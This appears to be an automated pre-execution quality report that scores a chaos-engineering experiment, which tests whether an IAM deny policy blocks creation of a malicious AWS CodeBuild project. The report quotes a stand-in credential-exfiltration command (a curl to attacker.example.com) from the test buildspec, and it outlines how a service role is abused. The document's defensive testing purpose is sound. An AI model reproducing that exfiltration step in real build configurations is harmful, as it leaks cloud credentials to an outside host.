# PRE-EXECUTION QUALITY EVALUATION REPORT

## Experiment Information
- **SCE Node**: 1.3 SCE Experiment
- **Probe Type**: Preventive
- **Attack Nodes**: 1.2 Create Malicious CodeBuild Project
- **Evaluation Date**: 2024-01-15

## Factor 1: ACTION ↔ Attack Correspondence
**Score**: 100
**Justification**: The ADT specifies Attack Node 1.2 as "Create Malicious CodeBuild Project" using `aws codebuild create-project` with dependencies on `iam:PassRole` and `codebuild:CreateProject`, mapped to TTP T1552.005 (Unsecured Credentials). The Python implementation directly mirrors this: the `attack()` function assumes the attack role and calls `cb_client.create_project()` with a malicious buildspec that includes credential exfiltration commands (`curl http://attacker.example.com/exfil`). The project configuration includes `NO_SOURCE`, `NO_ARTIFACTS`, and a `LINUX_CONTAINER` environment — a realistic malicious project setup. The IAM role includes `iam:PassRole` permission via the `AllowCodeBuildReadOnly` policy, matching the stated dependency. The tactic (credential access / privilege escalation via CodeBuild) and technique (creating a malicious project to abuse the service role) are fully aligned. The implementation quality is high with proper error handling, retry logic for role assumption, evidence collection, and immediate cleanup of any accidentally created project.

---

## Factor 2: Defense ↔ Defense Correspondence
**Score**: 100
**Justification**: The ADT specifies Defense Node 1.1 "IAM Least Privilege Control" with classification "Preventive", strategy "Restrict CodeBuild IAM permissions", and mechanism "Fine-grained IAM role scoping." The implementation deploys a CloudFormation stack containing a `PreventiveControl` managed policy that explicitly denies `codebuild:CreateProject` and `codebuild:UpdateProject` on all resources (`Resource: "*"`). This is an explicit IAM deny policy — a direct implementation of the ADT's specified preventive control mechanism. The deny policy is attached to the attack role, ensuring the principle of least privilege is enforced. The implementation goes beyond basic correspondence: it uses CloudFormation for reproducible infrastructure, includes both the deny policy and a read-only baseline policy (demonstrating fine-grained scoping), and the hypothesis verification (Check 3) explicitly validates that the deny policy remains attached to the role. The code quality is high with proper IAM eventual consistency handling (15-second wait), CloudFormation stack lifecycle management, and comprehensive error handling.

---

## Factor 3: PROBE ↔ Defensive Intent Correspondence
**Score**: 100
**Justification**: The ADT's SCE Node 1.3 poses the preventive probe question: "Can IAM restrictions block project creation?" The experiment directly answers this question through a structured three-phase approach: (1) deploy the preventive IAM deny policy, (2) attempt the malicious CodeBuild project creation, and (3) verify the control's effectiveness. The `hypothesis_verification()` function performs three checks that comprehensively validate the preventive intent: it confirms the API call was denied with `AccessDeniedException`, verifies no malicious project exists in the account, and confirms the deny policy is still attached. The experiment manifest's steady-state hypothesis is explicitly titled "Malicious CodeBuild project creation is blocked by preventive IAM deny policy," which directly maps to the probe's defensive intent. The probe type is correctly identified as "Preventive" in both the manifest and implementation.

---

## FINAL SCORE CALCULATION

**Q_pre = 0.40 × 100 + 0.30 × 100 + 0.30 × 100**
Q_pre = 100.00

**Threshold**: 80
**Result**: Q_pre >= 80

## DECISION

**AUTHORIZE EXECUTION**

---

## Recommendations

The experiment is well-designed and fully aligned with the ADT specification. Minor enhancements for consideration in future iterations:

1. **CloudTrail Validation**: While the experiment focuses on the preventive probe, adding an optional check for CloudTrail logging of the denied API call would provide additional evidence and partially address the detective probe mentioned in the ADT node.
2. **Parameterization**: The region and timestamp are module-level constants; consider making these configurable via environment variables or the Chaos Toolkit configuration for greater flexibility.
3. **SCP Testing**: The ADT mentions SCP as an alternative preventive mechanism. A variant experiment testing an SCP-based deny would broaden coverage.
4. **Module Path**: The Chaos Toolkit manifest references `chaosaws.ec2.1_3_sce_experiment_preventive` — the `ec2` sub-module seems misaligned with a CodeBuild experiment; consider using a more appropriate module path like `chaosaws.codebuild.1_3_sce_experiment_preventive`.